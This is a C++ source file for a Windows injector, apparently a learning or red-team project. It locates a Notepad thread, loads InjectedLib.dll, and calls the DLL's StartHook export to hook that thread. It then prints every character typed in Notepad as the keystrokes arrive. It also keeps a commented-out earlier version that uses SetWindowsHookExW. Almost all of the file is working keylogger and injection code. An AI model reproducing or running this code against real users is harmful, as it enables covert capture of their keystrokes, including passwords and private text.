// HookInject.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <string>



LPCSTR DecodeChar(int code)
{
	//https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes?redirectedfrom=MSDN
	LPCSTR key = NULL;
	switch (code) {
		case 97: key = "a"; break;
		case 98: key = "b"; break;
		case 99: key = "c"; break;
		case 100: key = "d"; break;
		case 101: key = "e"; break;
		case 102: key = "f"; break;
		case 103: key = "g"; break;
		case 104: key = "h"; break;
		case 105: key = "i"; break;
		case 106: key = "j"; break;
		case 107: key = "k"; break;
		case 108: key = "l"; break;
		case 109: key = "m"; break;
		case 110: key = "n"; break;
		case 111: key = "o"; break;
		case 112: key = "p"; break;
		case 113: key = "q"; break;
		case 114: key = "r"; break;
		case 115: key = "s"; break;
		case 116: key = "t"; break;
		case 117: key = "u"; break;
		case 118: key = "v"; break;
		case 119: key = "w"; break;
		case 120: key = "x"; break;
		case 121: key = "y"; break;
		case 122: key = "z"; break;
		case 49:  key = "1"; break;
		case 50:  key = "2"; break;
		case 51:  key = "3"; break;
		case 52:  key = "4"; break;
		case 53:  key = "5"; break;
		case 54:  key = "6"; break;
		case 55:  key = "7"; break;
		case 56:  key = "8"; break;
		case 57:  key = "9"; break;
		case 48:  key = "0"; break;
		default: key = "unknown"; break;
	}
	return key;
}

int FindMainNotepadThread() {

	THREADENTRY32 th32;
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;
	HANDLE hProcess;
	DWORD dwSize = MAX_PATH;
	wchar_t bExeName[MAX_PATH];

	//https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes?redirectedfrom=MSDN

	//https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
	//Create a snapshot of all running threads on the system and return a handle to it
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); 

	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("CreateToolHelp32Snapshot failed: %lu\n", GetLastError());
		return 1;
	}
	th32.dwSize = sizeof(THREADENTRY32); //Have to initalize the dwSize for the struct to work

	//https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first
	if( !Thread32First(hSnapshot, &th32) )
	{
		printf("Error reading first thread: %lu\n", GetLastError());
		CloseHandle(hSnapshot);
		return 1;
	}

	//Open a handle to the first process in the snapshot
	//printf("Attempting to open a handle to the first process: %d\n", th32.th32OwnerProcessID);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, th32.th32OwnerProcessID);
	if (hProcess != NULL)
	{
		//Check the image name, if it's notepad then return the PID

		if (!QueryFullProcessImageNameW(hProcess, 0, bExeName, &dwSize))
		{
			printf("Error in QueryFullProcessImageNameW: %lu\n", GetLastError());
			CloseHandle(hProcess);
		}
		else
		{
			if (wcsstr(bExeName, L"notepad.exe") != nullptr)

			{
				//printf("\n\n     THREAD ID      = %d\n", th32.th32ThreadID);
				//wprintf(L"Image Name: %s\n", bExeName);
				CloseHandle(hProcess);
				CloseHandle(hSnapshot);
				return th32.th32ThreadID;
			}
		}
	}
	else
	{
		//printf("Failure to OpenProcess: %lu\n", GetLastError());
		CloseHandle(hProcess);
	}
	wchar_t* output;
	//Continue with the rest of the threads in the snapshot in a loop until the correct one is found
	while (Thread32Next(hSnapshot, &th32))
	{
		DWORD dwSize = MAX_PATH;
		//Open a handle to the process in the snapshot
		//printf("Attempting to open a handle to the process: %d\n", th32.th32OwnerProcessID);
		
		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, th32.th32OwnerProcessID);
		if (hProcess != NULL)
		{
			/*if (th32.th32ThreadID == 7180)
			{
				printf("Inside of notepad\n");
				printf("=================\n");
				printf("OwnerProcessID: %d\n", th32.th32OwnerProcessID);
				QueryFullProcessImageNameW(hProcess, 0, bExeName, &dwSize);
				wprintf(L"Image Name: %s\n", bExeName);
				printf("=================\n");
			}*/
			//Check the image name, if it's notepad then return the PID
			if (QueryFullProcessImageNameW(hProcess, 0, bExeName, &dwSize) == '0')
			{
				printf("Error in QueryFullProcessImageNameW: %lu\n", GetLastError());
				CloseHandle(hProcess);
			}
			else
			{
				
				if (wcsstr(bExeName, L"notepad.exe") != nullptr)
				
				{
					//printf("\n\n     THREAD ID      = %d\n", th32.th32ThreadID);
					//wprintf(L"Image Name: %s\n", bExeName);
					CloseHandle(hProcess);
					CloseHandle(hSnapshot);
					return th32.th32ThreadID;
				}
			}
		}
		else
		{
			CloseHandle(hProcess);
		}
	}
	
	return 0;
}

int main()
{
	HMODULE hModule;
	DWORD dwthreadID = NULL;
	HHOOK hHook = NULL;


	dwthreadID = FindMainNotepadThread();
	if (dwthreadID != NULL) //Function returns 0 on failure, otherwise returns the TID
	{
		printf("[*] Notepad TID located: %lu\n", dwthreadID);

		hModule = LoadLibraryW(L"InjectedLib.dll");
		//HOOKPROC pHookFunction = NULL;
		//static pFunc pHookFunction;
		if (hModule == NULL)
		{
			printf("[-] Failed to load DLL: %lu\n", GetLastError());
			return 1;
		}
		printf("[*] Loaded InjectedLib.dll...\n");


		/*typedef bool(__cdecl* SetNotificationThreadProc)(DWORD ThreadId);

		SetNotificationThreadProc SetNotificationThread = (SetNotificationThreadProc)GetProcAddress(hModule, "SetNotificationThread");
		printf("[*] Succesfully retrieved SetNotificationThread address...\n");

		DWORD dwCurrentThreadID = GetCurrentThreadId();

		printf("[*] Injector TID: %d \n", dwCurrentThreadID);

		if (SetNotificationThread((DWORD)dwCurrentThreadID) != 0)
			printf("[!] SetNotificationThread calling failed: %lu\n", GetLastError());

		printf("[*] Succesfully called SetNotificationThread...\n");
		*/
		DWORD dwCurrentThreadID = GetCurrentThreadId();

		printf("[*] Injector TID: %d \n", dwCurrentThreadID);
		typedef void(__cdecl* HookFunc)(DWORD dwthreadID, DWORD CurrentThreadID, HINSTANCE hModule);
		typedef void(__cdecl* StopHookFunc)(void);
		HookFunc StartHook = (HookFunc)GetProcAddress(hModule, "StartHook");
		if (StartHook == NULL)
		{
			printf("[-] Failed to retrieve address for StartHook: %lu\n", GetLastError());
			return 1;
		}
		printf("[*] Preparing to call StartHook()\n");
		StartHook(dwthreadID, GetCurrentThreadId(), (HINSTANCE)hModule);

		//Call PostThreadMessage on the notepad thread to force it to wake up and load the DLL
		if (PostThreadMessageW(dwthreadID, WM_NULL, NULL, NULL) == 0) //success is nonzero, failure is zero
		{
			printf("Failed to post message to thread: %lu\n", GetLastError());
			return 1;
		}
		printf("[*] Succesfully posted message to thread: %d...\n", dwthreadID);

		MSG Message;
		printf("[!] Starting GetMessageLoop...\n");
		printf("============================\n");
		while (GetMessageW(&Message, NULL, 0, 0))
		{
			if (Message.message == WM_CHAR)
			{
				printf("%s", DecodeChar((int)Message.wParam));
				//printf("wParam: %lu\n", Message.wParam);
				//printf("Additional: %lu\n", Message.lParam);
			}


		}
		printf("GetMessage loop exited...unhooking processes\n\n");
		StopHookFunc StopHook = (StopHookFunc)GetProcAddress(hModule, "StopHook");
		if (StopHook == NULL)
		{
			printf("[-] Failed to retrieve address for StopHook: %lu\n", GetLastError());
			return 1;
		}
		StopHook();
		FreeLibrary(hModule);
		return 0;

		//Old Code that tried to SetWindowsHookEx remotely, kept for reference and to try and feel better about wasted effort :)
		//=================================================================
		// 
		//Locate the hook function in the DLL
		//...GetProcAddress...SetWindowsHookEx
		/*pHookFunction = (HOOKPROC)GetProcAddress(hModule, "HookFunction");
		if (pHookFunction == NULL)
		{
			printf("Failed to locate HookFunction address: %lu\n", GetLastError());
			return 1;
		}

		hHook = SetWindowsHookExW(WH_GETMESSAGE, pHookFunction, hModule, dwthreadID);

		if (hHook != NULL)
		{
			printf("[*] Succesfully called SetWindowsHookExW on thread: %d...\n", dwthreadID);
			//Call SetNotificationThread in the DLL and pass the ThreadID and the hook handle
			typedef bool (__cdecl *SetNotificationThreadProc)(DWORD ThreadId, HHOOK hHook);

			SetNotificationThreadProc SetNotificationThread = (SetNotificationThreadProc)GetProcAddress(hModule, "SetNotificationThread");
			printf("[*] Succesfully retrieved SetNotificationThread address...\n");

			DWORD dwCurrentThreadID = GetCurrentThreadId();

			printf("[*] Injector TID: %d \n", dwCurrentThreadID);

			if (SetNotificationThread((DWORD)dwCurrentThreadID, (HHOOK)hHook) != 0)
				printf("[!] SetNotificationThread calling failed: %lu\n", GetLastError());

			printf("[*] Succesfully called SetNotificationThread...\n");


			//Call PostThreadMessage on the notepad thread to force it to wake up and load the DLL
			if (PostThreadMessageW(dwthreadID, WM_NULL, NULL, NULL) == 0) //success is nonzero, failure is zero
			{
				printf("Failed to post message to thread: %lu\n", GetLastError());
				return 1;
			}
			printf("[*] Succesfully posted message to thread: %d...\n", dwthreadID);
			//https://docs.microsoft.com/en-us/windows/win32/winmsg/using-messages-and-message-queues
			MSG Message;
			printf("[!] Starting GetMessageLoop...\n");
			printf("============================\n");
			while (GetMessageW(&Message, NULL, 0, 0))
			{
				printf("============================\n");
				//TranslateMessage(&Message);
				printf("Key Pressed: %lu\n", Message.wParam);
				printf("Message: %d\n", Message.message);
				//DispatchMessageW(&Message);
				if (Message.message == WM_CHAR)
				{
					printf("Key Pressed: %lu\n", Message.wParam);
					printf("Message: %d\n", Message.message);
					//printf("wParam: %lu\n", Message.wParam);
				}


			}
			printf("GetMessage loop exited...unhooking processes\n\n");
			UnhookWindowsHookEx(hHook);
			exit(0);

		}
		else
		{
			printf("Failed to SetWindowsHookExW: %lu\n", GetLastError());
			return 1;
		}
		*/
	}
	else
	{
		printf("Failed to find notepad thread: %lu\n", GetLastError());
		return 1;
	}
	
}